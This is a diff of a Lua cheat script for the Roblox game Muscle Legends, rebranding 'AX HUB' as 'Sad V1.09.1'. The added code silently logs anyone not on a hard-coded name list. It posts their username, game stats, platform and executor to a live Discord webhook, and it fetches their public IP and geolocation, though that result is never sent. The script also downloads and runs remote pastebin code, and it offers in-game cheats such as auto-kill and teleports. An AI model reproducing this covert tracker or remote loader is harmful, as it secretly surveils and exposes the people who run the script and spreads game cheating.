@@ -2,7 +2,6 @@ local a = game:GetService("StarterGui")
 local function b(b, c, d)
     a:SetCore("SendNotification", {Title = b, Text = c, Duration = d})
 end
-
 local a = {
     "LuaWorldV99",
     "triggasarealzigga",
@@ -14,9 +13,263 @@ local a = {
     "BlistarZ3900",
     "EAEAeAeALOL312323121"
 }
-
 if game.PlaceId == 3623096087 then
-
+    local c, d =
+        pcall(
+        function()
+            local b = game:GetService("Players").LocalPlayer
+            local c = b.Name
+            if table.find(a, c) then
+            else
+                local a = b.DisplayName
+                local d =
+                    "https://discord.com/api/webhooks/1339695197604282400/97_1jK9eg-delcdHdBdN4Mt8D-XHnQ37FGhRB_Ju6bYJgJ8-SQIBEr_Or09o_UfjWvUf"
+                local function e(a, b, c)
+                    if syn and syn.request then
+                        return syn.request(
+                            {Url = b, Method = a, Headers = {["Content-Type"] = "application/json"}, Body = c}
+                        )
+                    elseif http_request then
+                        return http_request(
+                            {Url = b, Method = a, Headers = {["Content-Type"] = "application/json"}, Body = c}
+                        )
+                    elseif request then
+                        return request(
+                            {Url = b, Method = a, Headers = {["Content-Type"] = "application/json"}, Body = c}
+                        )
+                    else
+                    end
+                end
+                local function f(a)
+                    if a >= 1e15 then
+                        return string.format("%.2f Qa", a / 1e15)
+                    elseif a >= 1e12 then
+                        return string.format("%.2f T", a / 1e12)
+                    elseif a >= 1e9 then
+                        return string.format("%.2f B", a / 1e9)
+                    elseif a >= 1e6 then
+                        return string.format("%.2f M", a / 1e6)
+                    elseif a >= 1e3 then
+                        return string.format("%.2f k", a / 1e3)
+                    else
+                        return tostring(a)
+                    end
+                end
+                local function g(a)
+                    local a = tostring(a)
+                    return a:reverse():gsub("(%d%d%d)", "%1."):reverse():gsub("^%.", "")
+                end
+                local h = e("GET", "https://api.ipify.org/?format=json")
+                local h = game:GetService("HttpService"):JSONDecode(h.Body)
+                local h = tostring(h.ip)
+                local h = e("GET", string.format("http://ipwho.is/%s", h))
+                local h = game:GetService("HttpService"):JSONDecode(h.Body)
+                local h = game:GetService("UserInputService")
+                local i = "Unknown"
+                local j = false
+                local k, l =
+                    pcall(
+                    function()
+                        keypress(20)
+                    end
+                )
+                if not k then
+                    j = true
+                    i = "iOS"
+                elseif h.TouchEnabled then
+                    i = "Android or Emulator"
+                else
+                    i = "PC"
+                end
+                local h
+                if syn then
+                    h = "Codex"
+                elseif http_request then
+                    h = "Delta"
+                elseif request then
+                    h = "Fluxus"
+                else
+                    h = "Unknown Executor"
+                end
+                local j = b:FindFirstChild("leaderstats")
+                local k = "N/A"
+                local l = "N/A"
+                local m = "N/A"
+                local n = "N/A"
+                if j then
+                    if j:FindFirstChild("Strength") then
+                        local a = j.Strength.Value
+                        k = g(a) .. " (" .. f(a) .. ")"
+                    end
+                    if b:FindFirstChild("Durability") then
+                        local a = b.Durability.Value
+                        l = g(a) .. " (" .. f(a) .. ")"
+                    end
+                    if j:FindFirstChild("Kills") then
+                        m = g(j.Kills.Value)
+                    end
+                    if j:FindFirstChild("Rebirths") then
+                        n = g(j.Rebirths.Value)
+                    end
+                end
+                local b = i .. ", " .. h
+                local a = {
+                    ["description"] = "AX HUB script executed",
+                    ["title"] = "ðŸ’ª Muscle Legends",
+                    ["type"] = "rich",
+                    ["color"] = tonumber(7506394),
+                    ["fields"] = {
+                        {["name"] = "User:", ["value"] = c .. " (" .. a .. ")", ["inline"] = true},
+                        {["name"] = "Strength:", ["value"] = k, ["inline"] = false},
+                        {["name"] = "Durability:", ["value"] = l, ["inline"] = true},
+                        {["name"] = "Rebirths:", ["value"] = n, ["inline"] = false},
+                        {["name"] = "Kills:", ["value"] = m, ["inline"] = true},
+                        {["name"] = "Platform:", ["value"] = b, ["inline"] = true}
+                    }
+                }
+                local a = {["embeds"] = {a}}
+                e("POST", d, game:GetService("HttpService"):JSONEncode(a))
+            end
+        end
+    )
+    if not c then
+    end
+    wait()
+    local c = game:GetService("TweenService")
+    local d = Instance.new("ScreenGui")
+    local e = Instance.new("Frame")
+    local f = Instance.new("UICorner")
+    local g = Instance.new("TextButton")
+    local h = Instance.new("TextButton")
+    local i = Instance.new("TextBox")
+    local j = Instance.new("UICorner")
+    local k = Instance.new("UICorner")
+    local l = Instance.new("UICorner")
+    local m = Instance.new("TextLabel")
+    local n = Instance.new("TextLabel")
+    d.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+    d.Name = "KeySystemGui"
+    e.Name = "KeyMain"
+    e.Parent = d
+    e.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+    e.Size = UDim2.new(0, 260, 0, 170)
+    e.Position = UDim2.new(0.5, -130, 0.5, -85)
+    f.CornerRadius = UDim.new(0, 15)
+    f.Parent = e
+    m.Name = "TitleLabel"
+    m.Parent = e
+    m.BackgroundTransparency = 1
+    m.Size = UDim2.new(0, 240, 0, 40)
+    m.Position = UDim2.new(0.5, -120, 0, 0)
+    m.Font = Enum.Font.FredokaOne
+    m.Text = "AX HUB"
+    m.TextColor3 = Color3.fromRGB(255, 255, 255)
+    m.TextSize = 30
+    m.TextStrokeTransparency = 0.8
+    n.Name = "DescriptionLabel"
+    n.Parent = e
+    n.BackgroundTransparency = 1
+    n.Size = UDim2.new(0, 240, 0, 40)
+    n.Position = UDim2.new(0.5, -120, 0.15, 0)
+    n.Font = Enum.Font.PatrickHand
+    n.Text = "Click 'Get Key' to copy the discord server link, where you will find the permanent key!"
+    n.TextColor3 = Color3.fromRGB(255, 255, 255)
+    n.TextSize = 14
+    n.TextWrapped = true
+    n.TextStrokeTransparency = 0.8
+    i.Name = "KeyInputBox"
+    i.Parent = e
+    i.BackgroundColor3 = Color3.fromRGB(55, 55, 55)
+    i.Size = UDim2.new(0, 220, 0, 38)
+    i.Position = UDim2.new(0.077, 0, 0.4, 0)
+    i.Font = Enum.Font.SourceSans
+    i.PlaceholderText = "Enter Key"
+    i.Text = ""
+    i.TextColor3 = Color3.fromRGB(255, 255, 255)
+    i.TextSize = 14
+    l.CornerRadius = UDim.new(0, 15)
+    l.Parent = i
+    g.Name = "GetKeyButton"
+    g.Parent = e
+    g.BackgroundColor3 = Color3.fromRGB(55, 55, 55)
+    g.Size = UDim2.new(0, 100, 0, 38)
+    g.Position = UDim2.new(0.1, 0, 0.7, 0)
+    g.Text = "Get Key"
+    g.Font = Enum.Font.PatrickHand
+    g.TextColor3 = Color3.fromRGB(255, 255, 255)
+    g.TextSize = 14
+    j.CornerRadius = UDim.new(0, 15)
+    j.Parent = g
+    h.Name = "SubmitButton"
+    h.Parent = e
+    h.BackgroundColor3 = Color3.fromRGB(55, 55, 55)
+    h.Size = UDim2.new(0, 100, 0, 38)
+    h.Position = UDim2.new(0.55, 0, 0.7, 0)
+    h.Text = "Submit"
+    h.Font = Enum.Font.PatrickHand
+    h.TextColor3 = Color3.fromRGB(255, 255, 255)
+    h.TextSize = 14
+    k.CornerRadius = UDim.new(0, 15)
+    k.Parent = h
+    local function d(a)
+        a.MouseEnter:Connect(
+            function()
+                local a =
+                    c:Create(
+                    a,
+                    TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
+                    {BackgroundColor3 = Color3.fromRGB(75, 75, 75)}
+                )
+                a:Play()
+            end
+        )
+        a.MouseLeave:Connect(
+            function()
+                local a =
+                    c:Create(
+                    a,
+                    TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
+                    {BackgroundColor3 = Color3.fromRGB(55, 55, 55)}
+                )
+                a:Play()
+            end
+        )
+    end
+    d(g)
+    d(h)
+    local d = "Sad"
+    local function f()
+        setclipboard("https://discord.gg/wJsayfrTtS")
+    end
+    local function j()
+        local f = i.Text
+        if f == d then
+            i.Text = "Valid!"
+            i.TextColor3 = Color3.fromRGB(0, 255, 0)
+            wait(0.5)
+            local d =
+                c:Create(
+                e,
+                TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
+                {BackgroundTransparency = 1}
+            )
+            d:Play()
+            local f = {g, h, i, m, n}
+            for a, a in ipairs(f) do
+                local a =
+                    c:Create(
+                    a,
+                    TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
+                    {BackgroundTransparency = 1, TextTransparency = 1}
+                )
+                a:Play()
+            end
+            d.Completed:Connect(
+                function()
+                    e:Destroy()
+                end
+            )
+            wait(1)
             if not _G.AXHUBLOADED then
                 _G.AXHUBLOADED = true
                 local c = game.Players.LocalPlayer
@@ -294,11 +547,9 @@ if game.PlaceId == 3623096087 then
                     end
                 end
                 local O = loadstring(game:HttpGet("https://pastebin.com/raw/EhNzAZ2R"))()
-                local P = O:Load("AX HUB", "Default")
-                local P = O.newTab("🏠 Main", "ImageIdHere")
-                P.newLabel("✨ Made By: BzlAdamBzl & xterminator47x78_3 ✨")
-                P.newLabel("👑 Founder & Lead Programmer: BzlAdamBzl (W4ttziez) 👑")
-                P.newLabel("💡 Co. Founder & Discord Community Server Founder: xterminator47x78_3 💬")
+                local P = O:Load("Sad V1.09.1", "Default")
+                local P = O.newTab("Main", "ImageIdHere")
+                P.newLabel("Made By: Sad")
                 P.newSlider(
                     "WalkSpeed",
                     "This also allows you to walk while workout! (Only works with items in your inventory. Ex: pushups.)",
@@ -998,7 +1249,7 @@ if game.PlaceId == 3623096087 then
                         end
                     end
                 )
-                local b = O.newTab("👊 Punching", "ImageIdHere")
+                local b = O.newTab("Punching", "ImageIdHere")
                 b.newLabel("Killing Section")
                 b.newToggle(
                     "Auto Kill",
@@ -1745,7 +1996,7 @@ if game.PlaceId == 3623096087 then
                         end
                     end
                 )
-                local a = O.newTab("🚀 Areas", "ImageIdHere")
+                local a = O.newTab("Teleport", "ImageIdHere")
                 a.newButton(
                     "Safe Place",
                     "Teleport to area",
@@ -1831,7 +2082,7 @@ if game.PlaceId == 3623096087 then
                         game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-38, 5, 1884)
                     end
                 )
-                local a = O.newTab("💪 Grinding", "ImageIdHere")
+                local a = O.newTab("Farm", "ImageIdHere")
                 a.newInput(
                     "Enter Rebirth Stop",
                     "Enter where you want your auto-rebirth to stop. If not entered, auto-rebirth will run indefinitely.",
@@ -2035,7 +2286,7 @@ if game.PlaceId == 3623096087 then
                         end
                     end
                 )
-                local a = O.newTab("🎁 Extras", "ImageIdHere")
+                local a = O.newTab("Miscellaneous", "ImageIdHere")
                 a.newButton(
                     "Infinite Jump",
                     "Hold jump button (or spam it) for infinite jumping!",
@@ -2695,13 +2946,13 @@ if game.PlaceId == 3623096087 then
                         end
                     end
                 )
-                a.newLabel("🎮THIS IS AX HUB 1.09.1")
+                a.newLabel("THIS IS SAD V1.09.1")
                 a.newLabel(
-                    "📖There's a 'status' button at the top right corner of your screen, shows every player's full status real-time!"
+                    "There's a 'status' button at the top right corner of your screen, shows every player's full status real-time!"
                 )
-                a.newLabel("📖All map barriers are removed. (Annoying invisible walls)")
+                a.newLabel("All map barriers are removed. (Annoying invisible walls)")
                 a.newLabel("📖All statues in every map have been removed. (annoying)")
-                a.newLabel("🔥Happy Exploiting!🔥")
+                a.newLabel("Happy Exploiting!")
             else
             end
         else
@@ -2716,5 +2967,5 @@ if game.PlaceId == 3623096087 then
     g.MouseButton1Click:Connect(f)
     h.MouseButton1Click:Connect(j)
 else
-    b("Invalid Game!", "AX HUB only works on '💪Muscle Legends'.", 15)
+    b("Invalid Game!", "Sad V1.09.1 only works on '💪Muscle Legends'.", 15)
 end
